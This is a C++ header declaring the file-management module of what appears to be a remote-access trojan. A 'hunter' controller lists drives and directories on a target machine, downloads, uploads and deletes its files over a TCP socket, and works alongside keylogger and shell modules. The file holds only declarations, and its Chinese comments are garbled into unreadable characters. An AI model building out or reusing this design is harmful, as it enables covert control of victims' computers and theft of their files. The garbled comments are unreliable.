// �ļ���ز���ģ��
// ���õ���ģʽ

#pragma once
#include "TcpSocket.h"
#include <map>
#include <vector>
#include <cstdlib>

class File
{
public:
	File();

	// -------------------------�����ļ��������ָ��---------------------------------
	// hunter����ʳ��
	std::string CmdGetDirFiles;       // ��ȡ·���µ������ļ�����·����
	std::string CmdDownloadFile;      // hunter��ʳ�������ļ�
	std::string CmdUploadFile;        // hunter�ϴ��ļ���ʳ��
	std::string CmdDeleteFile;        // hunter��ʳ����ɾ���ļ�
	// ʳ�﷢��hunter
	std::string CmdSendDrives;        // �����̷�
	std::string CmdSendDirs;          // ����·��������·����
	std::string CmdSendFiles;         // ����·���������ļ���
	std::string CmdDeleteFileSuccess; // �ɹ�ɾ���ļ�
	std::string CmdDeleteFileFailed;  // ɾ���ļ�ʧ��
	// �ָ��������
	std::string CmdSplit;
	std::string CmdEnd;
	std::string CmdFileSplit;
	// -------------------------�����ļ��������ָ��(��)---------------------------------

	// ������ں��� ��Keybd��shellģ����ʽ���
	static void startByNewThread(std::string domain, int port);
	static DWORD WINAPI fileThreadProc(LPVOID args);
	static void startFile(std::string domain, int port);
	// ���������ִ��
	static void addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size);
	static std::map<std::string, std::string> parseArgs(std::string& data);
	static void processCmd(TcpSocket* sock, std::string& cmd, std::string& data);
	// �����ļ�������
	static void doGetDirFiles(TcpSocket* sock, std::map<std::string, std::string>& args);
	static void doDownloadFile(TcpSocket* sock, std::map<std::string, std::string>& args);
	static void doUploadFile(TcpSocket* sock, std::map<std::string, std::string>& args);
	static void doDeleteFile(TcpSocket* sock, std::map<std::string, std::string>& args);

	// ��ȡ�����̷�
	static std::vector<std::string> getDrives();
	// ��ȡ·��������·��
	static std::vector<std::string> getDirs(std::string dir);
	// ��ȡ·���������ļ�
	static std::vector<std::string> getFiles(std::string dir);

	// �����ļ����Զ������ݰ�ͷ
	typedef struct {
		char fileName[256];
		unsigned int len;
	} FileHeader;

	// �����ļ���ں�������ȻҪ�ٿ�һ���߳��ˣ�
	static void startSendFileByNewThread(std::string filePath, std::string domain, int port);
	static DWORD WINAPI sendFileThreadProc(LPVOID args);
	static void startSendFile(std::string filePath, std::string domain, int port);
	// �����ļ���ں�������ȻҪ�ٿ�һ���߳��ˣ�
	static void startRecvFileByNewThread(std::string filePath, std::string domain, int port);
	static DWORD WINAPI recvFileThreadProc(LPVOID args);
	static void startRecvFile(std::string filePath, std::string domain, int port);
};

